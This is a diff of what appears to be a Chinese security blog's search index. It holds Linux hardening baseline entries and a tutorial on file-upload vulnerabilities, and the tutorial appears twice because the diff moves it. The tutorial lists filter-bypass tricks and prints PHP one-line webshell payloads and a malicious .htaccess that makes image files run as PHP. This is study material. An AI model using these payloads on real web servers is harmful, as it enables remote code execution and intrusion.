+<h1 id="六、系统关键目录访问权限"><a href="#六、系统关键目录访问权限" class="headerlink" title="六、系统关键目录访问权限"></a>六、系统关键目录访问权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关键目录权限控制</span><br><span class="line">配置要求：根据安全需要，配置某些关键目录其所需的最小权限；</span><br><span class="line">          重点要求password配置文件、shadow文件、group文件权限。</span><br><span class="line">         当前主流版本的linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，</span><br><span class="line">         应定期对权限进行检查及复核，确保权限设置正确。</span><br><span class="line">操作指南：查看关键目录的用户对应权限参考命令</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">检查方法：与管理员确认已有权限为最小权限。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">        通过chmod命令对目录的权限进行实际设置。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        	/etc/passwd 所有用户都可读，root用户可写 –rw-r—r— </span><br><span class="line">        配置命令：chmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow 只有root可读 –r-------- </span><br><span class="line">        配置命令：chmod 600 /etc/shadow；</span><br><span class="line">        	/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</span><br><span class="line">        配置命令：chmod 644 /etc/group；</span><br><span class="line">        如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）执行命令#chmod -R go-w,o-r /etc</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="七、用户缺省权限控制"><a href="#七、用户缺省权限控制" class="headerlink" title="七、用户缺省权限控制"></a>七、用户缺省权限控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户缺省权限控制</span><br><span class="line">配置要求：控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于</span><br><span class="line">该组的其它用户及别的组的用户修改该用户的文件或更高限制。</span><br><span class="line">操作指南：1、# cat /etc/bashrc  查看全局默认设置umask值</span><br><span class="line">          2、查看具体用户home目录下bash_profile，具体用户的umask</span><br><span class="line">检查方法：查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）；</span><br><span class="line">          查看具体用户的umask，本着最小权限的原则。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          单独针对用户设置</span><br><span class="line">          可修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">          全局默认设置：</span><br><span class="line">          默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，</span><br><span class="line">          通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="八、安全日志完备性要求"><a href="#八、安全日志完备性要求" class="headerlink" title="八、安全日志完备性要求"></a>八、安全日志完备性要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安全日志完备性要求</span><br><span class="line">配置要求：系统应配置完备日志记录，记录对与系统相关的安全事件。</span><br><span class="line">操作指南：1、# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">          2、# cat /var/log/secure查看是否有对应配置</span><br><span class="line">检查方法：1、cat /etc/syslog.conf确认有对应配置；</span><br><span class="line">          2、查看/var/log/secure，应记录有需要的设备相关的安全事件。</span><br><span class="line">配置方法：修改配置文件vi /etc/syslog.conf。</span><br><span class="line">          配置如下类似语句：</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          定义为需要保存的设备相关安全事件。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="九、统一远程日志服务器配置"><a href="#九、统一远程日志服务器配置" class="headerlink" title="九、统一远程日志服务器配置"></a>九、统一远程日志服务器配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：统一远程日志服务器配置</span><br><span class="line">配置要求：当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份。</span><br><span class="line">操作指南：# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">检查方法：配置了远程日志服务器为符合</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">          修改配置文件vi /etc/syslog.conf，</span><br><span class="line">          加上这一行：</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          可以将&quot;*.*&quot;替换为你实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名。</span><br><span class="line">          重新启动syslog服务，执行下列命令：</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2、补充操作说明</span><br><span class="line">          注意：*.*和@之间为一个Tab</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十、设置history时间戳"><a href="#十、设置history时间戳" class="headerlink" title="十、设置history时间戳"></a>十、设置history时间戳</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：设置history时间戳</span><br><span class="line">配置要求：配置history时间戳，便于审计。</span><br><span class="line">操作指南：# cat /etc/bashrc查看是否有对应配置</span><br><span class="line">检查方法：已添加，如：“export HISTTIMEFORMAT=&quot;%F %T”配置为符合。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          在/etc/bashrc文件中增加如下行：</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十一、ssh登录配置"><a href="#十一、ssh登录配置" class="headerlink" title="十一、ssh登录配置"></a>十一、ssh登录配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：SSH登录配置</span><br><span class="line">配置要求：系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护。</span><br><span class="line">操作指南：1、查看SSH服务状态：# ps –elf|grep ssh；</span><br><span class="line">          2、查看telnet服务状态：# ps –elf|grep telnet。</span><br><span class="line">检查方法：1、	不能使用telnet进行远程维护；</span><br><span class="line">          2、	应使用SSH进行远程维护；</span><br><span class="line">          3、	SSH配置要符合如下要求；</span><br><span class="line">              Protocol  2 #使用ssh2版本</span><br><span class="line">              X11Forwarding yes #允许窗口图形传输使用ssh加密</span><br><span class="line">              IgnoreRhosts  yes#完全禁止SSHD使用.rhosts文件</span><br><span class="line">              RhostsAuthentication no #不设置使用基于rhosts的安全验证</span><br><span class="line">              RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证</span><br><span class="line">              HostbasedAuthentication no #不允许基于主机白名单方式认证</span><br><span class="line">              PermitRootLogin no #不允许root登录</span><br><span class="line">              PermitEmptyPasswords no #不允许空密码</span><br><span class="line">              Banner /etc/motd  #设置ssh登录时显示的banner</span><br><span class="line">          4、以上条件都满足为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            编辑 sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述。</span><br><span class="line">          2、补充操作说明</span><br><span class="line">            查看SSH服务状态：# ps –elf|grep ssh</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十二、关闭不必要的服务"><a href="#十二、关闭不必要的服务" class="headerlink" title="十二、关闭不必要的服务"></a>十二、关闭不必要的服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关闭不必要的系统服务</span><br><span class="line">配置要求：根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改。</span><br><span class="line">如无特殊需要，应关闭Sendmail、Telnet、Bind等服务。</span><br><span class="line">操作指南：执行命令 #chkconfig --list，查看哪些服务开放。</span><br><span class="line">检查方法：与管理员确认无用服务已关闭</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">        使用如下方式禁用不必要的服务</span><br><span class="line">        #service &lt;服务名&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2、参考说明</span><br><span class="line">        Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：</span><br><span class="line">        “lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；</span><br><span class="line">        “telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；</span><br><span class="line">        “routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用；</span><br><span class="line">        “sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；</span><br><span class="line">        “Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭；</span><br><span class="line">        “identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭；</span><br><span class="line">        “xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险；</span><br><span class="line">        R服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，</span><br><span class="line">        其他场合下均必须禁用；</span><br><span class="line">        基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十三、禁止ctr-alt-del键盘关闭命令"><a href="#十三、禁止ctr-alt-del键盘关闭命令" class="headerlink" title="十三、禁止ctr+alt+del键盘关闭命令"></a>十三、禁止ctr+alt+del键盘关闭命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：禁止Control-Alt-Delete键盘关闭命令</span><br><span class="line">配置要求：应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作</span><br><span class="line">操作指南：命令cat /etc/inittab，查看配置</span><br><span class="line">检查方法：/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            在“/etc/inittab” 文件中注释掉下面这行（使用#）： ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            为了使此改动生效，输入下面这个命令： # /sbin/init q</span><br><span class="line">        2、补充说明</span><br><span class="line">            禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十四、安装操作系统补丁"><a href="#十四、安装操作系统补丁" class="headerlink" title="十四、安装操作系统补丁"></a>十四、安装操作系统补丁</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安装操作系统更新补丁</span><br><span class="line">配置要求：安装操作系统更新补丁，修复系统漏洞</span><br><span class="line">操作指南：1、查看当前系统补丁版本</span><br><span class="line">          2、检查官网当前系统版本是否发布安全更新。</span><br><span class="line">检查方法：版本应保持为最新</span><br><span class="line">配置方法：通过访问</span><br><span class="line">https://rhn.redhat.com/errata/下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，</span><br><span class="line">选择需要的补丁下载。</span><br><span class="line">         下载的补丁为rpm安装包，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，</span><br><span class="line">         检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作。</span><br><span class="line">适用版本：Linux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>安全基线</tag>
       </tags>
   </entry>
   <entry>
@@ -5182,6 +5187,104 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>文件上传漏洞</title>
+    <url>/archives/931c692.html</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>该漏洞的产生时因为软件编写人员没有对用户的上传行为做过滤，如没有对文件的上传类型做限制，那么用户就可以上传任意类型的文件，从而造成危害。</p>
+<h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><p>前端过滤</p>
+<p>通过js过滤文件扩展名：可通过禁用js，抓包改包、修改文件后缀名的方式绕过，重写前端过滤函数</p>
+<h2 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h2><p><strong>识别文件扩展名</strong>：只在后端是基于黑名单过滤的时候有效。在appache中，识别文件名的方法时从右向左识别，遇到不能识别的扩展名就会被忽略，直到遇到一个可识别的扩展名。所以我们可以通过构建这样的扩展名绕过，<code>test.php.tar</code> 在apache的配置文件中有一个defaulttype选项，该选项设置了当文件名不可被识别的时候处理该文件的策略。默认会被当成text&#x2F;plain类型处理。<del>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止</del>。</p>
+<p><strong>识别mime类型</strong>：通过抓包改包软件过滤</p>
+<p><strong>识别文件头部字符</strong>：在文件中插入对应文件的标志字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47494638 //gif文件头&lt;?php@eval($_POST[123])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过修改中间件配置文件</strong>，使得文件存储目录对应后缀名文件只能以特定的方式被读取</p>
+<p><code>AddType text/plain .py .txt .php</code> &#x2F;&#x2F;这样设置php文件将被作为文本文件看待。</p>
+<p>禁止此类文件被访问</p>
+<p><code>Options -ExecCGI AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</code></p>
+<p>强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>
+<p><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt; ForceType text/plain &lt;/FilesMatch&gt;</code></p>
+<p>只允许访问特定类型的文件.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</p>
+<p><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt; order deny,allow deny from all &lt;/Files&gt;</code></p>
+<p>上述过滤策略均可通过上传.htaccess伪静态文件，被覆盖。伪静态文件被执行需要设置了<code>allowoverride</code> 在该文件中写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行&lt;/IfModule&gt;或者&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;或者&lt;IfModule mime_module&gt;AddType application/x-httpd-php .gif&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>文件系统截断</strong>，当文件系统遇到0x00的时候，会认为文件已经结束，这样我么可以这样构造扩展名a.php%00jpg。当文件系统读取文件的时候遇到%00的时候会认为文件已经结束，<code>但如果过滤系统只是简单得判断后缀名是不是php的话，他得到的是php%jpg这当然不是php,所以成功通过</code>，这样我们就有了一个a.php的文件。</p>
+<p>**利用ntfs文件系统的ads特性：**构造这样一个文件名a.php::<em>DATA</em>，<em>在这个文件中</em>，<em>后缀名明显不是php</em>，<em>那么针对后缀名检测就失效了</em>，<em>但是ntfs文件系统却能识别这种格式</em>，<em>其中</em>DATA表示该ads流是一个文件流，但是因为流名为空，即该宿主文件并没有挂着一个ads流文件，那么ntfs文件系统讲执行宿主文件，如果流名不为空则会执行寄宿文件。</p>
+<p><strong>使用大小写绕过</strong></p>
+<p><code>PHP/PhP</code></p>
+<p><strong>使用另类扩展名</strong></p>
+<p><code>php2/php3/php4/php5/php /php./php../pht/phtml</code></p>
+<p><strong>后缀冗余</strong></p>
+<p><code>添加如%81这类的非法文件名到文件末尾</code> a.php%81</p>
+<p><strong>双写绕过</strong></p>
+<p><code>phphpp</code> 该处涉及对方替换的时候，是从前往后还是从后往前识别的<code>pphphp</code> 与<code>phphpp</code> 是两种完全不同的情况</p>
+<p><strong>二次渲染绕过</strong></p>
+<p>我们上传的文件很多时候都会被二次渲染并存储到别的位置，在进行二次渲染的过程中，甚至会去掉其中的冗余部分，也就是我们附加的一句话木马部分，这时候，我们就需要利用工具对比原图片于二次渲染后的图片中相同的部分，也就是没有被改变的部分，在这部分部分插入一句话木马，来绕过该限制如<code>winhex和010editor</code></p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled.png"></p>
+<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled.png</p>
+<blockquote>
+<p>针对GIF文件</p>
+</blockquote>
+<p>直接使用010editer比较两次上传文件区别，在相同部分插入代码就可以了</p>
+<blockquote>
+<p>针对PNG文件</p>
+</blockquote>
+<p>直接像修改gif文件那样已经行不通了，需要将代码写入的PLET数据块或者IDAT数据开中</p>
+<p><strong>写入到PLET数据块中</strong></p>
+<p>使用索引图像才能写入成功，所以需要在ps中改一下图片的图像模式。为索引颜色</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%201.png"></p>
+<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%201.png</p>
+<p>这样修改之后，使用脚本工具将脚本写到图片中，这时候再上传可能还是会失败</p>
+<p><a href="jpg_secong_render_PLET.py">jpg_secong_render_PLET.py</a></p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%202.png"></p>
+<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%202.png</p>
+<p>尝试再次上传渲染</p>
+<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%203.png"></p>
+<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%203.png</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成功~~~~~</span><br></pre></td></tr></table></figure>
+
+<p><strong>写入到IDAT数据块</strong></p>
+<p>直接跑脚本</p>
+<p><a href="jpg_second_render.php">png_second_render.php</a></p>
+<blockquote>
+<p>针对jpg文件</p>
+</blockquote>
+<p>直接上脚本</p>
+<p><a href="jpg_secong_render_PLET%201.py">jpg_secong_render_PLET.py</a></p>
+<p><a href="jpg_payload.php">jpg_payload.php</a></p>
+<p>注意事项：</p>
+<ol>
+<li>需要被 imagecreatefromjpeg 渲染或再用工具</li>
+<li>图片找的稍微大一点 成功率更高</li>
+<li>Payload 语句越短成功率越高</li>
+<li>一张图片不行就换一张 不要死磕</li>
+<li>国光补充：貌似白色的图片成功率也比较高</li>
+<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种payload 成功率很高</li>
+</ol>
+<p><strong>条件竞争—并发漏洞</strong></p>
+<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。在进行二次渲染的过程中可能存在该楼哦东</p>
+<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
+<p><strong>文件解析漏洞</strong></p>
+<p>再iis中如果上传*.asp;1.jpg的文件，iis会将该文件当作asp文件解析；将*.asp&#x2F;目录下的所有文件会被当成asp解析；默认会将扩展名为.asa，.cdx，.cer解析为asp</p>
+<p>在后端开启了cgi的情况下，请求这样的地址<code>http://www.armandhe.com/a.jpg/a.php</code> 其中a.jpg是我们请求的真实文件，a.php是不存在的一个文件，可以任意定义，此时a.jpg文件会被当作是php文件去解析执行。</p>
+<p><code>对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。 例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。</code></p>
+<p><code>php的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径， 例如：当php遇到文件路径&quot;/info.jpg/xxx.php/lxh.sec&quot;时 若&quot;/info.jpg/xxx.php/lxh.sec&quot;不存在，则会去掉最后的&quot;/lxh.sec&quot;，然后判断&quot;/info.jpg/xxx.php&quot;是否存在 若存在则将/info.jpg/xxx.php，当作文件/info.jpg/xxx.php/lxh.sec 若/info.jpg/xxx.php仍不存在，则继续去掉xxx.php,依此类推。</code></p>
+<p><strong>addhandler漏洞 ：AddHandler application&#x2F;x-httpd-php .jpg</strong></p>
+<p>如果这样设置，所有文件名中含有.php的文件都会被当作php文件执行。</p>
+<p>**换行漏洞：**php中的$修饰不仅可以匹配字符串的结尾，而且可以匹配所以这样的文件名是可以的1.php0A，如此的话就可以绕过正则表达式。</p>
+<p><strong>.&#x2F; :使用move_upload_file的时候，当文件存储的路径可控的时候，路径后面的&#x2F;.会被忽略，即<code>hack.php/.</code></strong></p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+        <tag>PHP</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>数据链路层设备及协议：交换机、单臂路由、三层交换机、VLAN、ARP</title>
     <url>/archives/776f7656.html</url>
     <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><p>本笔记部分参考网址：</p>
@@ -5326,104 +5429,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>漏洞原理</tag>
         <tag>PHP</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/archives/931c692.html</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>该漏洞的产生时因为软件编写人员没有对用户的上传行为做过滤，如没有对文件的上传类型做限制，那么用户就可以上传任意类型的文件，从而造成危害。</p>
-<h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><p>前端过滤</p>
-<p>通过js过滤文件扩展名：可通过禁用js，抓包改包、修改文件后缀名的方式绕过，重写前端过滤函数</p>
-<h2 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h2><p><strong>识别文件扩展名</strong>：只在后端是基于黑名单过滤的时候有效。在appache中，识别文件名的方法时从右向左识别，遇到不能识别的扩展名就会被忽略，直到遇到一个可识别的扩展名。所以我们可以通过构建这样的扩展名绕过，<code>test.php.tar</code> 在apache的配置文件中有一个defaulttype选项，该选项设置了当文件名不可被识别的时候处理该文件的策略。默认会被当成text&#x2F;plain类型处理。<del>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止</del>。</p>
-<p><strong>识别mime类型</strong>：通过抓包改包软件过滤</p>
-<p><strong>识别文件头部字符</strong>：在文件中插入对应文件的标志字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47494638 //gif文件头&lt;?php@eval($_POST[123])?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>通过修改中间件配置文件</strong>，使得文件存储目录对应后缀名文件只能以特定的方式被读取</p>
-<p><code>AddType text/plain .py .txt .php</code> &#x2F;&#x2F;这样设置php文件将被作为文本文件看待。</p>
-<p>禁止此类文件被访问</p>
-<p><code>Options -ExecCGI AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</code></p>
-<p>强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>
-<p><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt; ForceType text/plain &lt;/FilesMatch&gt;</code></p>
-<p>只允许访问特定类型的文件.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</p>
-<p><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt; order deny,allow deny from all &lt;/Files&gt;</code></p>
-<p>上述过滤策略均可通过上传.htaccess伪静态文件，被覆盖。伪静态文件被执行需要设置了<code>allowoverride</code> 在该文件中写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行&lt;/IfModule&gt;或者&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;或者&lt;IfModule mime_module&gt;AddType application/x-httpd-php .gif&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>文件系统截断</strong>，当文件系统遇到0x00的时候，会认为文件已经结束，这样我么可以这样构造扩展名a.php%00jpg。当文件系统读取文件的时候遇到%00的时候会认为文件已经结束，<code>但如果过滤系统只是简单得判断后缀名是不是php的话，他得到的是php%jpg这当然不是php,所以成功通过</code>，这样我们就有了一个a.php的文件。</p>
-<p>**利用ntfs文件系统的ads特性：**构造这样一个文件名a.php::<em>DATA</em>，<em>在这个文件中</em>，<em>后缀名明显不是php</em>，<em>那么针对后缀名检测就失效了</em>，<em>但是ntfs文件系统却能识别这种格式</em>，<em>其中</em>DATA表示该ads流是一个文件流，但是因为流名为空，即该宿主文件并没有挂着一个ads流文件，那么ntfs文件系统讲执行宿主文件，如果流名不为空则会执行寄宿文件。</p>
-<p><strong>使用大小写绕过</strong></p>
-<p><code>PHP/PhP</code></p>
-<p><strong>使用另类扩展名</strong></p>
-<p><code>php2/php3/php4/php5/php /php./php../pht/phtml</code></p>
-<p><strong>后缀冗余</strong></p>
-<p><code>添加如%81这类的非法文件名到文件末尾</code> a.php%81</p>
-<p><strong>双写绕过</strong></p>
-<p><code>phphpp</code> 该处涉及对方替换的时候，是从前往后还是从后往前识别的<code>pphphp</code> 与<code>phphpp</code> 是两种完全不同的情况</p>
-<p><strong>二次渲染绕过</strong></p>
-<p>我们上传的文件很多时候都会被二次渲染并存储到别的位置，在进行二次渲染的过程中，甚至会去掉其中的冗余部分，也就是我们附加的一句话木马部分，这时候，我们就需要利用工具对比原图片于二次渲染后的图片中相同的部分，也就是没有被改变的部分，在这部分部分插入一句话木马，来绕过该限制如<code>winhex和010editor</code></p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled.png"></p>
-<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled.png</p>
-<blockquote>
-<p>针对GIF文件</p>
-</blockquote>
-<p>直接使用010editer比较两次上传文件区别，在相同部分插入代码就可以了</p>
-<blockquote>
-<p>针对PNG文件</p>
-</blockquote>
-<p>直接像修改gif文件那样已经行不通了，需要将代码写入的PLET数据块或者IDAT数据开中</p>
-<p><strong>写入到PLET数据块中</strong></p>
-<p>使用索引图像才能写入成功，所以需要在ps中改一下图片的图像模式。为索引颜色</p>
-<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%201.png"></p>
